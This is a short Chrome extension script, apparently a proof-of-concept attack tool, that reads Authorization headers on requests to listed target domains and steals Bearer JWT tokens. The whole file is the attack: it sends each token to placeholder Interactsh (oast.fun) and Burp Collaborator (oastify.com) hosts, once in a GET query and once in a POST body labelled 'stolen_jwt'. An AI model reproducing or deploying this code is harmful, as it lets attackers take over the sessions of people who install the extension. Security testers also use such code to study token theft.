// Listens for browser requests
chrome.webRequest.onBeforeSendHeaders.addListener(
    function (details) {
        // Loops through all the headers in the request
        for (var i = 0; i < details.requestHeaders.length; ++i) {
            // Checks if there is an authorization header
            if (details.requestHeaders[i].name.toLowerCase() === 'authorization') {
                // 'looks' at the value of the authorization header
                let token = details.requestHeaders[i].value;

                // Checks if the value begins with 'Bearer ey'
                if (token.startsWith('Bearer ey')) {

                    // INTERACTSH EXFILTRATION
                    // Replace YOUR_INTERACTSH_ID with your actual payload
                    fetch(`https://YOUR_INTERACTSH_ID.oast.fun/?token=${encodeURIComponent(token)}`, {
                        method: 'GET',
                        mode: 'no-cors'
                    });

                    // BURP COLLABORATOR EXFILTRATION
                    // Replace YOUR_COLLABORATOR_ID with your actual payload
                    fetch(`http://YOUR_COLLABORATOR_ID.oastify.com/`, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({ stolen_jwt: token })
                    });
                }
            }
        }
        return { requestHeaders: details.requestHeaders };
    },
    {
        //Traffic of target(s) to be monitired. Targets here must be exactly the same as listed in 'host permissions' in manifest.json file.
        urls: [
            "*://*.target-app.com/*",
            "*://*.another-target.com/*"
        ]  
    },
    ["requestHeaders"]
);